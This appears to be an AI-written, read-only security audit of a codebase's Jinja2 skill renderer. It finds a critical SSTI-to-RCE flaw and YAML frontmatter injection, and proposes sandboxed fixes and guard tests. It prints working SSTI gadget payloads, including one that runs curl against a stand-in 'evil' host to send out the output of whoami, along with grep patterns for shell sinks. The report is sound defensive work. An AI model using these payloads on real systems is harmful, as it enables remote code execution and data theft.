# SSTI / Template-Injection Bug-Class Sweep

**Date:** 2026-06-16
**Scope:** `src/general_ludd/` — Jinja2 / Ansible templating and remote-data interpolation.
**Method:** READ-ONLY manual code review. Constraints in effect for this audit: no
`Bash`, no `make`, no test execution, no sub-agents, and — in this environment —
**no `Grep`/`Glob` tool was available**. Every row below is grounded in a file I
read in full; see "Coverage & honesty caveat" at the bottom for what that means for
exhaustiveness. Nothing was executed; all payloads are illustrative only.

---

## 1. Core verdict (the audit's flagged finding)

**CONFIRMED — CRITICAL SSTI → RCE.** Untrusted, attacker-controllable skill-body
text reaches a **non-sandboxed** Jinja2 `Environment` and is rendered.

### The vulnerable sink

`src/general_ludd/skills/renderer.py:56`
```python
env = Environment(undefined=StrictUndefined, autoescape=False)   # NOT SandboxedEnvironment
...
template = env.from_string(body)   # :58 — body is the raw skill text
return template.render(**vars_dict)  # :59
```
A plain `jinja2.Environment` exposes the full Python object graph through template
expressions. `StrictUndefined` only rejects *undefined names*; it does **not**
remove the built-in globals (`cycler`, `range`, `dict`, `lipsum`, `namespace`, `self`)
or block dunder attribute traversal. `autoescape=False` is irrelevant to RCE (it
governs HTML escaping, not sandboxing). So the classic gadget chain is fully reachable.

### The reachability / data flow (untrusted → sink)

1. **Untrusted ingress.** Operators (or anyone who can reach the admin API) supply a
   remote skill URL/repo:
   - `POST /admin/skills/fetch` → `routers/skills.py:76-87` → `RemoteSkillFetcher.install` → `fetcher.py:97 fetch()` → `httpx.get(url)` → `parse_skill_md(resp.text)` (`fetcher.py:112`).
   - `POST /admin/skills/fetch-github` → `routers/skills.py:89-113` → `GitHubSkillSource.download_skill` → `httpx.get(raw_url)` → `parse_skill_md(resp.text)` (`fetcher.py:93`).
   The fetched bytes are entirely attacker-controlled (a GitHub repo / raw URL the
   attacker hosts). The SSRF guard (`is_safe_fetch_url`) restricts the *host*, not the
   *content*.
2. **Body extraction.** `parse_skill_md` (`skills/loader.py:11-52`) splits frontmatter
   and assigns the remainder verbatim to `Skill.body` (`loader.py:41`). No sanitization
   of Jinja syntax.
3. **Persistence.** The body is written to the skills install dir
   (`fetcher.py:129-130`, `routers/skills.py:110-112`) and later re-discovered via
   `discover_skills` (`loader.py:55-65`).
4. **Into a job.** `JobSpec.skill_body` (`schemas/job.py:28`) carries that text.
5. **The render.** `execution/engine.py:62` → `_render_skill_body(job.skill_body)`
   (`engine.py:44-53`) → `render_skill(raw, variables)` → the vulnerable
   `renderer.py:56` `Environment`. `engine.py:62` passes **no `variables`**, so
   `StrictUndefined` never even fires for the gadget payload (the gadget uses globals,
   not undefined names).
6. The rendered text becomes the model **system prompt** (`engine.py:63`), but the RCE
   happens *at render time, in the worker process*, before the model is ever called —
   `template.render()` executes the `os.popen` gadget in-process.

   Note the renderer docstring (`renderer.py:3-7`) names **two** consumers:
   `execution/engine.py` and the `gludd_skill` Ansible module. Both inherit this sink.

### Proof-of-concept (DO NOT RUN — illustrative)

A hosted `SKILL.md` whose body is:
```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
or, equivalently, the namespace/builtins walk that survives `StrictUndefined`:
```jinja
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://evil/$(whoami)').read() }}
```
Fetch it via `POST /admin/skills/fetch {"url": "https://attacker.example/SKILL.md"}`,
let it be selected into a job's `skill_body`, and the worker executes the shell on
`_build_system_prompt`.

### Why the Ansible path is NOT vulnerable but this one is

The repo already has the correct pattern — the skills renderer simply didn't adopt it:
`ansible/templating.py:56-89` `render_sandboxed()` uses `SandboxedEnvironment` +
`StrictUndefined` + `env.globals.clear()` + `wrap_unsafe` on every value, and fails
closed. `renderer.py` should mirror it. This is a one-off regression against an
established in-repo security boundary, which makes it both clearly a bug and easy to fix.

---

## 2. Prioritized bug-class table

| # | File:line | Class | Severity | Untrusted input? | Why |
|---|-----------|-------|----------|------------------|-----|
| 1 | `skills/renderer.py:56` (`.from_string`+`.render` at :58-59) | SSTI → RCE (non-sandboxed Jinja2 `Environment`) | **CRITICAL** | **Yes** — remote skill body via fetcher → `JobSpec.skill_body` | Plain `Environment` exposes globals/dunders; `StrictUndefined`/`autoescape=False` do not sandbox. Gadget `{{ cycler.__init__.__globals__.os.popen(...) }}` runs at render time in-worker. The documented sandbox sibling (`render_sandboxed`) was not used. |
| 2 | `execution/engine.py:44-53,62` | SSTI reachability (caller of #1) | **CRITICAL** | **Yes** — `job.skill_body` | Feeds untrusted body straight into the vulnerable renderer with no `variables`, and **swallows non-`SkillRenderError` exceptions** (`:51-53 except Exception: return raw`) — so a sandbox swap must raise a *typed* error or the catch-all will silently fall back to the raw body. Fix #1, then narrow this catch. |
| 3 | `ansible/core_runner.py:544-553` `render_template` → `Templar.template()` | Full-Templar SSTI → RCE (lookups = shell) | **HIGH** (CRITICAL if ever fed untrusted) | Not currently (trusted-only by contract) | `Templar.template` exposes `{{ lookup('pipe','id') }}`. Guarded only by the *documented* trusted-only contract of `AnsibleTemplater.render` (`templating.py:46-54`). No code-level guard stops a future caller from passing remote/LLM text here. Recurrence risk is high; needs a guard test. |
| 4 | `ansible/templating.py:46-54` `AnsibleTemplater.render` | Trusted-only wrapper over #3 | **HIGH** | Not currently | Same exposure as #3, one layer up. The network endpoint (`routers/ansible.py:47`) correctly uses `render_sandboxed`, but `render()` remains a loaded gun reachable from any in-process caller. |
| 5 | `skills/fetcher.py:129` (`install`) | YAML frontmatter injection via unescaped f-string | **MEDIUM** | **Yes** — remote `skill.name` / `skill.description` | `content = f"---\nname: {skill.name}\ndescription: {skill.description}\n---\n\n{skill.body}\n"`. A name/description containing a newline + YAML can inject arbitrary frontmatter keys (e.g. forge `tools:`, `model_profile:`, `trigger_patterns:`) that `parse_skill_md` (`loader.py:25-40`) will trust. Not RCE, but a privilege/behavior-forgery primitive that also feeds the body into sink #1. Name is later jailed for the *filename* only (`_safe_skill_filename`), not for YAML content. |
| 6 | `routers/skills.py:110` (`fetch-github` handler) | YAML frontmatter injection via unescaped f-string | **MEDIUM** | **Yes** — remote `skill.name` / `skill.description` | Identical construction to #5 (`content = f"---\nname: {skill.name}\n...`). Same forged-frontmatter risk on the GitHub fetch path. |
| 7 | `skills/loader.py:11-52` `parse_skill_md` | Trust boundary: emits unsanitized `body` for templating | **MEDIUM** (contributory) | **Yes** | Correctly uses `yaml.safe_load` for frontmatter (good — no `yaml.load`), but passes the body through verbatim. This is the chokepoint where a "treat-body-as-untrusted" marker (or rejecting `{{`/`{%`) could be centralized; today nothing flags the body as untrusted before it reaches sink #1. |

### Things checked and found SAFE (so a fixer doesn't re-flag them)

| Location | Why it's safe |
|----------|---------------|
| `ansible/templating.py:56-89` `render_sandboxed` | `SandboxedEnvironment` + `StrictUndefined` + `env.globals.clear()` + `wrap_unsafe` on every var + fail-closed `TemplateRenderError`. This is the **reference fix** for #1. |
| `routers/ansible.py:26-54` `POST /admin/ansible/render` | Network-exposed untrusted template body is routed to `render_sandboxed`, not `render`. Correct. |
| `ansible/unsafe.py` `wrap_unsafe`/`wrap_extravars` | Marks every untrusted extra-var leaf `AnsibleUnsafe`, defeating value-smuggled re-templating. |
| `ansible/core_runner.py:258` | `run_playbook` wraps all extravars unsafe before the executor — value-injection into shell/template tasks is blocked. |
| `skills/catalog.py:99-118` `_build_skill_md` | Frontmatter built with `json.dumps` (valid YAML subset, properly quoted) — **not** vulnerable to the #5/#6 f-string injection. The fetcher paths should adopt this pattern. |
| `security/auth.py:118-136` `is_safe_fetch_url` | https-only, literal-host SSRF deny (loopback/RFC-1918/metadata), redirects disabled at call site (`fetcher.py:106`). Sound. |
| `security/auth.py:159-216` `is_safe_clone_url` | Blocks `ext::`/`git::`/`file://`, ssh `-o`/ProxyCommand injection, leading-`-` argv smuggling, SSRF hosts. Sound URL-interpolation guard. |
| `security/auth.py:52-69` / `sanitize.py:12-30` path jails | realpath+commonpath containment; `sanitize_path` rejects bare `..` segments (fail-closed). Sound. |
| `execution/engine.py:329-352,360-458` path/diff jail | Model-supplied write/patch paths are containment-checked (both `---` and `+++`); `patch` invoked list-form (no shell). Sound. |
| `execution/engine.py:83-90` / `_git_*` / `_run_tests` | All `subprocess` calls are **list-form argv**, never `shell=True`, never an f-string shell command. No shell injection. |

---

## 3. Per-instance fix + recurrence-guard

**#1 `skills/renderer.py:56` (CRITICAL) — the fix.**
Replace the plain environment with the sandboxed one, mirroring `render_sandboxed`:
```python
from jinja2.sandbox import SandboxedEnvironment
from jinja2.exceptions import SecurityError, TemplateError
env = SandboxedEnvironment(undefined=StrictUndefined, autoescape=False)
env.globals.clear()                 # drop cycler/range/lipsum/namespace/etc.
vars_dict = {k: ... for k, v in vars_dict.items()}  # optionally wrap_unsafe values
try:
    return env.from_string(body).render(**vars_dict)
except SecurityError as exc:
    raise SkillRenderError("skill template rejected by sandbox") from exc
except (UndefinedError, TemplateError) as exc:
    raise SkillRenderError(f"skill template error: {type(exc).__name__}") from exc
```
Fail closed; never leak a traceback. Keep raising `SkillRenderError` so the
`engine.py:49-50` branch (which re-raises `SkillRenderError`) propagates the rejection
instead of the catch-all returning the raw body.
**Guard test:** `test_render_skill_rejects_ssti` — assert that
`render_skill("{{ cycler.__init__.__globals__.os.popen('id').read() }}")` raises
`SkillRenderError` (and, defensively, that no subprocess/`os.popen` is reachable). Add
`{{ self._TemplateReference__context }}`, `{{ ''.__class__.__mro__ }}`,
`{{ lipsum.__globals__ }}`, `{{ namespace.__init__.__globals__ }}` as parametrized cases.

**#2 `engine.py:44-53` (CRITICAL, coupled to #1).**
After #1, **narrow the catch-all** at `:51-53` so a real render rejection is not
silently swallowed into "return raw body". Catch only `ImportError` (jinja2 absent) for
the raw-fallback; let `SkillRenderError` propagate and fail the job.
**Guard test:** `test_engine_skill_body_ssti_fails_closed` — a `JobSpec.skill_body`
carrying the gadget must abort `_build_system_prompt`/`execute`, not silently pass the
raw payload through, and must not execute the shell.

**#3 / #4 `core_runner.render_template` & `AnsibleTemplater.render` (HIGH).**
Keep the trusted-only contract but make it enforceable: add an explicit
`trusted: bool` (default `False`) parameter, or route all non-operator callers through
`render_sandboxed`. At minimum add an architectural/regression test that fails if any
**network-reachable** path (router/worker) calls `render()`/`render_template()` on
untrusted input.
**Guard test:** `test_admin_render_uses_sandbox` (assert `routers/ansible.py` calls
`render_sandboxed`, never `render`) + `test_render_template_is_trusted_only` (a
grep/AST assertion that no router or fetcher module imports/calls `render_template`).

**#5 / #6 frontmatter f-strings (MEDIUM).**
Stop hand-building YAML from untrusted strings. Reuse the catalog's safe approach:
serialize the frontmatter mapping with `yaml.safe_dump({...}, default_flow_style=False)`
(or `json.dumps`, which is valid YAML) so `name`/`description` are quoted/escaped, and
reject names/descriptions containing newlines or `---` before write.
**Guard test:** `test_install_skill_name_cannot_inject_frontmatter` — a fetched skill
with `name="x\ntools: [shell]\nmodel_profile: admin"` must round-trip through
`parse_skill_md` with `tools == []` and the literal name preserved (no injected keys).

**#7 `parse_skill_md` (MEDIUM, contributory).**
Centralize the untrusted-body marker here: either tag the returned `Skill.body` as
untrusted (so sink #1 must sandbox it) or, defense-in-depth, reject bodies that the
operator did not author from being rendered with template syntax at all.
**Guard test:** `test_parse_skill_md_uses_safe_load` (already implicitly true — assert
no `yaml.load`) + a test that a remote body is never rendered by a non-sandboxed env
(covered by #1's guard once the renderer is the single choke point).

---

## 4. Coverage & honesty caveat (read before trusting "exhaustive")

This sweep is grounded only in files I opened and read end-to-end:
`skills/renderer.py`, `execution/engine.py`, `skills/fetcher.py`, `routers/skills.py`,
`skills/loader.py`, `skills/skill.py`, `skills/catalog.py`, `skills/__init__.py`,
`schemas/job.py`, `ansible/templating.py`, `ansible/unsafe.py`, `ansible/core_runner.py`,
`routers/ansible.py`, `security/auth.py`, `security/sanitize.py`.

**No `Grep`/`Glob`/`Bash` was available in this environment**, so I could not
mechanically enumerate *every* `Environment(`/`Template(`/`Templar`/`from_string`/
f-string-into-YAML/`shell=True`/SQL-string site across the whole tree. The findings
above are high-confidence for the read files, but **the sweep is not provably
exhaustive.** Before declaring the bug class closed, run these mechanical sweeps over
all of `src/` and reconcile each hit against the SAFE/UNSAFE tables here:

```text
rg -n "Environment\(|\.from_string\(|Template\(|Templar|\.template\(" src/
rg -n "render_template|AnsibleTemplater\(|\.render\(" src/        # trusted-path callers
rg -n 'f"""?---|f"---|f-?string.*\{.*\}.*---' src/                # f-string YAML frontmatter
rg -n "shell=True|os\.system|os\.popen|subprocess\.(run|Popen|call).*shell" src/
rg -n "execute\(|executemany\(|text\(|\.format\(.*SELECT|f\".*SELECT" src/   # SQL string-building
rg -n "yaml\.load\(" src/                                          # unsafe yaml (none seen so far)
```

Specifically still-to-verify (named in the audit brief, not located without grep):
- the **`gludd_skill` Ansible module** named in `renderer.py:3-7` as the second consumer
  of `render_skill` — confirm it routes through the (fixed) sandboxed renderer and does
  not separately call `Templar`/`render()` on the skill body;
- any **worker/dispatch** code that populates `JobSpec.skill_body` (confirm no second,
  unsandboxed render of the body en route);
- any module doing **request/remote data → SQL** string concatenation (none seen in the
  files read; the curated-skills "security-first" text mentions parameterized queries but
  that is documentation, not a sink).

**Bottom line:** Finding #1 is a confirmed CRITICAL SSTI→RCE with a clear, in-repo fix
(adopt `SandboxedEnvironment` exactly as `ansible/templating.py:render_sandboxed` already
does). #3/#4 are latent HIGH guns that need enforceable guards. #5/#6 are real MEDIUM
YAML-injection sinks. Close the grep sweep above to upgrade this from "high-confidence on
read files" to "exhaustive."
